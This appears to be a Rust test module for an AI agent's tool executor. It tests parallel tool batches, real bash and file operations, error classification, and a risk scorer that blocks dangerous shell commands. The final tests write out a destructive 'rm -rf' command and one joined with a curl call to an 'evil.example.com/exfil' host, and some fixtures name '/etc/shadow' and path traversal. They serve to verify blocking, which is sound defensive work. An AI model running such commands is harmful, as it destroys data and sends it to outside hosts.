            let (event_tx, _rx) = halcon_core::event_bus(16);
            let mut idx = 0u32;

            let batch = vec![
                make_tool_call("t1", "file_read", serde_json::json!({"path": dir.path().join("a.txt").to_str().unwrap()})),
                make_tool_call("t2", "file_read", serde_json::json!({"path": dir.path().join("b.txt").to_str().unwrap()})),
            ];

            let results = execute_parallel_batch(
                &batch, &registry, dir.path().to_str().unwrap(),
                Duration::from_secs(10), &event_tx, None,
                uuid::Uuid::new_v4(), &mut idx, 10,
                &ToolExecutionConfig::default(), &*TEST_SINK,
                None, // plugin_registry
            ).await;

            assert_eq!(results.len(), 2);
            // Results sorted by id.
            assert_eq!(results[0].tool_use_id, "t1");
            assert_eq!(results[1].tool_use_id, "t2");

            // Both should have actual file content.
            for result in &results {
                match &result.content_block {
                    ContentBlock::ToolResult { is_error, content, .. } => {
                        assert!(!is_error, "tool_use_id={}: {content}", result.tool_use_id);
                        assert!(content.contains("content_"));
                    }
                    _ => panic!("expected ToolResult"),
                }
            }
        }

        #[tokio::test]
        async fn parallel_batch_mixed_success_and_error() {
            let dir = tempfile::TempDir::new().unwrap();
            std::fs::write(dir.path().join("exists.txt"), "ok").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let (event_tx, _rx) = halcon_core::event_bus(16);
            let mut idx = 0u32;

            let batch = vec![
                make_tool_call("success", "file_read", serde_json::json!({"path": dir.path().join("exists.txt").to_str().unwrap()})),
                make_tool_call("fail", "file_read", serde_json::json!({"path": "/nonexistent/file.txt"})),
            ];

            let results = execute_parallel_batch(
                &batch, &registry, dir.path().to_str().unwrap(),
                Duration::from_secs(10), &event_tx, None,
                uuid::Uuid::new_v4(), &mut idx, 10,
                &ToolExecutionConfig::default(), &*TEST_SINK,
                None, // plugin_registry
            ).await;

            assert_eq!(results.len(), 2);

            // Find each by tool_use_id.
            let success_result = results.iter().find(|r| r.tool_use_id == "success").unwrap();
            let fail_result = results.iter().find(|r| r.tool_use_id == "fail").unwrap();

            match &success_result.content_block {
                ContentBlock::ToolResult { is_error, content, .. } => {
                    assert!(!is_error);
                    assert!(content.contains("ok"));
                }
                _ => panic!("expected ToolResult"),
            }

            match &fail_result.content_block {
                ContentBlock::ToolResult { is_error, .. } => {
                    assert!(is_error);
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn parallel_batch_with_unknown_tool_mixed() {
            let registry = halcon_tools::default_registry(&Default::default());
            let (event_tx, _rx) = halcon_core::event_bus(16);
            let mut idx = 0u32;

            // file_read is ReadOnly → parallel. But nonexistent goes sequential.
            // In a real plan, unknown would go sequential. Here we test parallel batch directly.
            let batch = vec![
                make_tool_call("valid", "glob", serde_json::json!({"pattern": "*.nonexistent_ext"})),
            ];

            let results = execute_parallel_batch(
                &batch, &registry, "/tmp",
                Duration::from_secs(10), &event_tx, None,
                uuid::Uuid::new_v4(), &mut idx, 10,
                &ToolExecutionConfig::default(), &*TEST_SINK,
                None, // plugin_registry
            ).await;

            assert_eq!(results.len(), 1);
            assert_eq!(results[0].tool_use_id, "valid");
        }

        // --- Real tool execution through pipeline ---

        #[tokio::test]
        async fn real_bash_execution_through_executor() {
            let registry = halcon_tools::default_registry(&Default::default());
            let tool_call = make_tool_call(
                "bash-exec-1",
                "bash",
                serde_json::json!({"command": "echo integration_test_output"}),
            );

            let result = execute_one_tool(
                &tool_call, &registry, "/tmp",
                Duration::from_secs(10), DryRunMode::Off, None,
                &ToolRetryConfig::default(), &*TEST_SINK, None,
            ).await;

            assert_eq!(result.tool_name, "bash");
            match &result.content_block {
                ContentBlock::ToolResult { content, is_error, .. } => {
                    assert!(!is_error);
                    assert!(content.contains("integration_test_output"));
                }
                _ => panic!("expected ToolResult"),
            }
            assert!(result.duration_ms > 0, "real execution should have non-zero duration");
        }

        #[tokio::test]
        async fn real_grep_execution_through_executor() {
            let dir = tempfile::TempDir::new().unwrap();
            std::fs::write(dir.path().join("search_target.txt"), "needle in haystack\nhaystack only\n").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let tool_call = make_tool_call(
                "grep-exec-1",
                "grep",
                serde_json::json!({"pattern": "needle", "path": dir.path().to_str().unwrap()}),
            );

            let result = execute_one_tool(
                &tool_call, &registry, dir.path().to_str().unwrap(),
                Duration::from_secs(10), DryRunMode::Off, None,
                &ToolRetryConfig::default(), &*TEST_SINK, None,
            ).await;

            match &result.content_block {
                ContentBlock::ToolResult { content, is_error, .. } => {
                    assert!(!is_error);
                    assert!(content.contains("needle"));
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn real_file_write_then_read_roundtrip() {
            let dir = tempfile::TempDir::new().unwrap();
            let path = dir.path().join("roundtrip.txt");

            let registry = halcon_tools::default_registry(&Default::default());

            // Write.
            let write_call = make_tool_call(
                "write-1",
                "file_write",
                serde_json::json!({"path": path.to_str().unwrap(), "content": "roundtrip_data"}),
            );
            let write_result = execute_one_tool(
                &write_call, &registry, dir.path().to_str().unwrap(),
                Duration::from_secs(10), DryRunMode::Off, None,
                &ToolRetryConfig::default(), &*TEST_SINK, None,
            ).await;

            match &write_result.content_block {
                ContentBlock::ToolResult { is_error, .. } => assert!(!is_error),
                _ => panic!("expected ToolResult"),
            }

            // Read back.
            let read_call = make_tool_call(
                "read-1",
                "file_read",
                serde_json::json!({"path": path.to_str().unwrap()}),
            );
            let read_result = execute_one_tool(
                &read_call, &registry, dir.path().to_str().unwrap(),
                Duration::from_secs(10), DryRunMode::Off, None,
                &ToolRetryConfig::default(), &*TEST_SINK, None,
            ).await;

            match &read_result.content_block {
                ContentBlock::ToolResult { content, is_error, .. } => {
                    assert!(!is_error);
                    assert!(content.contains("roundtrip_data"));
                }
                _ => panic!("expected ToolResult"),
            }
        }

        // --- Protocol correctness: every result is ToolResult ---

        #[tokio::test]
        async fn all_results_are_tool_result_variant() {
            let dir = tempfile::TempDir::new().unwrap();
            std::fs::write(dir.path().join("f.txt"), "data").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let (event_tx, _rx) = halcon_core::event_bus(16);
            let mut idx = 0u32;

            let batch = vec![
                make_tool_call("r1", "file_read", serde_json::json!({"path": dir.path().join("f.txt").to_str().unwrap()})),
                make_tool_call("r2", "glob", serde_json::json!({"pattern": "*.txt", "path": dir.path().to_str().unwrap()})),
                make_tool_call("r3", "directory_tree", serde_json::json!({"path": dir.path().to_str().unwrap()})),
            ];

            let results = execute_parallel_batch(
                &batch, &registry, dir.path().to_str().unwrap(),
                Duration::from_secs(10), &event_tx, None,
                uuid::Uuid::new_v4(), &mut idx, 10,
                &ToolExecutionConfig::default(), &*TEST_SINK,
                None, // plugin_registry
            ).await;

            assert_eq!(results.len(), 3);
            for result in &results {
                match &result.content_block {
                    ContentBlock::ToolResult { tool_use_id, .. } => {
                        // Every result must have a tool_use_id that matches one of the inputs.
                        assert!(
                            ["r1", "r2", "r3"].contains(&tool_use_id.as_str()),
                            "unexpected tool_use_id: {tool_use_id}"
                        );
                    }
                    other => panic!("expected ToolResult, got {other:?}"),
                }
            }
        }

        // --- No orphan results ---

        #[tokio::test]
        async fn no_orphan_results_every_id_matches_input() {
            let dir = tempfile::TempDir::new().unwrap();
            std::fs::write(dir.path().join("a.txt"), "a").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let (event_tx, _rx) = halcon_core::event_bus(16);
            let mut idx = 0u32;

            let input_ids = vec!["id_alpha", "id_beta", "id_gamma"];
            let batch: Vec<CompletedToolUse> = input_ids.iter().map(|id| {
                make_tool_call(id, "file_read", serde_json::json!({"path": dir.path().join("a.txt").to_str().unwrap()}))
            }).collect();

            let results = execute_parallel_batch(
                &batch, &registry, dir.path().to_str().unwrap(),
                Duration::from_secs(10), &event_tx, None,
                uuid::Uuid::new_v4(), &mut idx, 10,
                &ToolExecutionConfig::default(), &*TEST_SINK,
                None, // plugin_registry
            ).await;

            // Every result ID must match an input ID.
            let result_ids: Vec<&str> = results.iter().map(|r| r.tool_use_id.as_str()).collect();
            for id in &input_ids {
                assert!(result_ids.contains(id), "missing result for input id: {id}");
            }
            // No extra results.
            assert_eq!(results.len(), input_ids.len());
        }

        // --- Event emission ---

        #[tokio::test]
        async fn events_emitted_during_parallel_execution() {
            let dir = tempfile::TempDir::new().unwrap();
            std::fs::write(dir.path().join("f.txt"), "event_test").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let (event_tx, mut rx) = halcon_core::event_bus(64);
            let mut idx = 0u32;

            let batch = vec![
                make_tool_call("ev1", "file_read", serde_json::json!({"path": dir.path().join("f.txt").to_str().unwrap()})),
            ];

            execute_parallel_batch(
                &batch, &registry, dir.path().to_str().unwrap(),
                Duration::from_secs(10), &event_tx, None,
                uuid::Uuid::new_v4(), &mut idx, 10,
                &ToolExecutionConfig::default(), &*TEST_SINK,
                None, // plugin_registry
            ).await;

            // Should have received at least one event.
            let mut event_count = 0;
            while rx.try_recv().is_ok() {
                event_count += 1;
            }
            assert!(event_count >= 1, "expected at least 1 event, got {event_count}");
        }

        // === Phase 27 (RC-3 fix): is_deterministic_error tests ===

        #[test]
        fn deterministic_file_not_found() {
            assert!(is_deterministic_error("No such file or directory: /tmp/missing.rs"));
            assert!(is_deterministic_error("Error: File not found at /foo/bar.txt"));
            assert!(is_deterministic_error("NOT FOUND"));
        }

        #[test]
        fn deterministic_permission_denied() {
            assert!(is_deterministic_error("Permission denied: /etc/shadow"));
            assert!(is_deterministic_error("PERMISSION DENIED for user"));
        }

        #[test]
        fn deterministic_path_type_errors() {
            assert!(is_deterministic_error("Error: /tmp is a directory, expected a file"));
            assert!(is_deterministic_error("not a directory: /tmp/file.txt/sub"));
        }

        #[test]
        fn deterministic_security_errors() {
            assert!(is_deterministic_error("path traversal detected in ../../etc/passwd"));
            assert!(is_deterministic_error("Operation blocked by security policy"));
            assert!(is_deterministic_error("unknown tool: foo_bar"));
            assert!(is_deterministic_error("Action denied by task context access control"));
        }

        #[test]
        fn deterministic_schema_errors() {
            assert!(is_deterministic_error("schema validation failed: invalid type"));
            assert!(is_deterministic_error("missing required field 'path'"));
        }

        #[test]
        fn non_deterministic_transient_errors() {
            // These should NOT be classified as deterministic
            assert!(!is_deterministic_error("connection timed out"));
            assert!(!is_deterministic_error("rate limit exceeded"));
            assert!(!is_deterministic_error("internal server error"));
            assert!(!is_deterministic_error("process killed by signal"));
            assert!(!is_deterministic_error("command exited with code 1"));
        }

        #[test]
        fn deterministic_empty_error() {
            assert!(!is_deterministic_error(""));
        }

        #[test]
        fn deterministic_case_insensitive() {
            assert!(is_deterministic_error("NO SUCH FILE OR DIRECTORY"));
            assert!(is_deterministic_error("Permission Denied"));
            assert!(is_deterministic_error("Is A Directory"));
            assert!(is_deterministic_error("Path Traversal"));
        }

        #[test]
        fn deterministic_mcp_environment_errors() {
            // SOTA 2026: Split MCP failures into transient vs deterministic.
            //
            // TRANSIENT (pool/connection can recover within the session):
            // MCP pool call failures and transport errors are transient — the MCP server
            // process may still be alive; the stdio/socket dropped and can reconnect.
            assert!(!is_deterministic_error("MCP pool call failed: connection refused to server"),
                "mcp pool call failed is transient (server may recover)");
            assert!(!is_deterministic_error("failed to call 'filesystem/read_file' after 5 attempts"),
                "failed to call is transient — retrying via is_transient_error path");
            assert!(!is_deterministic_error("connection reset by peer"),
                "connection reset is transient");
            assert!(!is_deterministic_error("transport error: channel closed"),
                "transport/channel errors are transient");

            // DETERMINISTIC (server/tool was never initialized; will never work):
            assert!(is_deterministic_error("MCP server is not initialized"),
                "server not initialized is deterministic");
            assert!(is_deterministic_error("not initialized: call ensure_initialized first"),
                "not initialized is deterministic");
            assert!(is_deterministic_error("process start failed: no such executable"),
                "process start failed is deterministic");
        }

        #[test]
        fn transient_mcp_connection_errors() {
            // MCP transport/connection errors can recover — classify as transient, NOT deterministic.
            assert!(!is_deterministic_error("MCP pool call failed: connection refused to server"));
            assert!(!is_deterministic_error("failed to call tool after 3 retries"));
            assert!(!is_deterministic_error("channel closed unexpectedly"));
        }

        // === Phase 27 Stress Tests ===

        #[test]
        fn stress_deterministic_1000_calls_consistent() {
            // Verify is_deterministic_error is deterministic across 1000 iterations
            let test_cases = vec![
                ("No such file or directory: /a/b/c.rs", true),
                ("permission denied", true),
                ("connection timed out", false),
                ("rate limit exceeded", false),
                ("unknown tool: xyz", true),
                ("path traversal attempt", true),
                ("blocked by security policy", true),
                ("command exited with code 137", false),
                ("", false),
            ];

            for _ in 0..1000 {
                for (error, expected) in &test_cases {
                    assert_eq!(
                        is_deterministic_error(error),
                        *expected,
                        "Inconsistent result for error: {error}"
                    );
                }
            }
        }

        #[test]
        fn stress_deterministic_with_varying_paths() {
            // 100 different file paths — all should be deterministic (contains "not found")
            for i in 0..100 {
                let err = format!("Error: File not found at /project/src/module_{i}/file_{i}.rs");
                assert!(
                    is_deterministic_error(&err),
                    "Expected deterministic for: {err}"
                );
            }
        }

        #[test]
        fn stress_non_deterministic_diverse_errors() {
            // 50 diverse non-deterministic errors
            let transient_patterns = [
                "connection refused",
                "connection reset by peer",
                "broken pipe",
                "timed out after 30s",
                "rate limit exceeded",
                "server returned 500",
                "server returned 502",
                "server returned 503",
                "process killed by OOM",
                "disk full",
            ];

            for (i, pattern) in transient_patterns.iter().enumerate() {
                for j in 0..5 {
                    let err = format!("{pattern} (attempt {i}.{j})");
                    assert!(
                        !is_deterministic_error(&err),
                        "Should NOT be deterministic: {err}"
                    );
                }
            }
        }
    }

    // ── Output Risk Scorer Wiring Tests (Critical Security Fix) ────────────────
    //
    // These tests verify that score_tool_args() is actively called in execute_one_tool()
    // and that high-risk bash commands are blocked BEFORE execution.

    #[tokio::test]
    async fn rm_rf_bash_command_blocked_by_risk_scorer() {
        // rm -rf is a destructive command that scores +50 → is_high_risk() → blocked.
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = CompletedToolUse {
            id: "t1".to_string(),
            name: "bash".to_string(),
            input: serde_json::json!({"command": "rm -rf /tmp/test_dir"}),
        };

        let result = execute_one_tool(
            &tool, &registry, "/tmp",
            Duration::from_secs(10), DryRunMode::Off, None,
            &ToolRetryConfig::default(), &*TEST_SINK, None,
        ).await;

        match &result.content_block {
            ContentBlock::ToolResult { content, is_error, .. } => {
                assert!(*is_error, "rm -rf should be blocked as high-risk");
                assert!(content.contains("[BLOCKED]"), "content should contain [BLOCKED]: {content}");
                assert!(content.contains("risk"), "content should mention risk: {content}");
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn clean_bash_command_passes_risk_scorer() {
        // `ls -la` is a safe command (score 0) and should NOT be blocked by risk scorer.
        // It will execute normally (ls returns output).
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = CompletedToolUse {
            id: "t1".to_string(),
            name: "bash".to_string(),
            input: serde_json::json!({"command": "echo hello"}),
        };

        let result = execute_one_tool(
            &tool, &registry, "/tmp",
            Duration::from_secs(10), DryRunMode::Off, None,
            &ToolRetryConfig::default(), &*TEST_SINK, None,
        ).await;

        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(!content.contains("[BLOCKED]"),
                    "echo hello should NOT be blocked by risk scorer: {content}");
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn rm_rf_combined_with_exfil_blocked_by_risk_scorer() {
        // rm -rf (+50) + curl to external (+30) = 80 total → blocked (>= 50).
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = CompletedToolUse {
            id: "t1".to_string(),
            name: "bash".to_string(),
            input: serde_json::json!({"command": "rm -rf /data && curl https://evil.example.com/exfil"}),
        };

        let result = execute_one_tool(
            &tool, &registry, "/tmp",
            Duration::from_secs(10), DryRunMode::Off, None,
            &ToolRetryConfig::default(), &*TEST_SINK, None,
        ).await;

        match &result.content_block {
            ContentBlock::ToolResult { content, is_error, .. } => {
                assert!(*is_error, "rm -rf + exfil should be blocked (score >= 50)");
                assert!(content.contains("[BLOCKED]"), "should contain [BLOCKED]: {content}");
            }
            _ => panic!("expected ToolResult"),
        }
    }
}
